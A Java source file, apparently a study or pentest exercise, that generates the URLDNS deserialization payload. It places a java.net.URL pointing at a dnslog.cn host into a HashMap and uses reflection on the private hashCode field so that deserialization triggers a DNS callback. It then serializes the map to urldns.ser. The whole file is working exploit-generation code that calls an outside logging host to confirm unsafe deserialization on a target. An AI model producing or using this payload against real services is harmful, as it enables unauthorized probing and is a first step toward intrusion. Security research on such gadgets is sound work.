package org.example.urlSer;


import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;

public class UrlDns {

    public static void main(String[] args) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL("http://g5w6xs.dnslog.cn");
        //获取URL类的hashCode属性
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        // 修改访问权限，必须使用setAccessible方法设置为True才能修改private属性
        f.setAccessible(true);
        // 设置hashCode值为123，这里可以是任何不为-1的数字。先这样设置是因为HashMap的put方法也会调用hash(key)方法，
        // 如果不这样的话，会在序列化的时候调用put方法然后调用hash(key)，然后直接进行了dnslog。
        f.set(url,123);
        System.out.println(url.hashCode());
        //往HashMap中添加Key为URL对象
        map.put(url,"123");
        // 将url的hashCode重新设置为-1。确保在反序列化时能够成功触发
        f.set(url,-1);

        try{
            // 序列化对象
            FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
            outputStream.writeObject(map);
            outputStream.close();
            fileOutputStream.close();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}


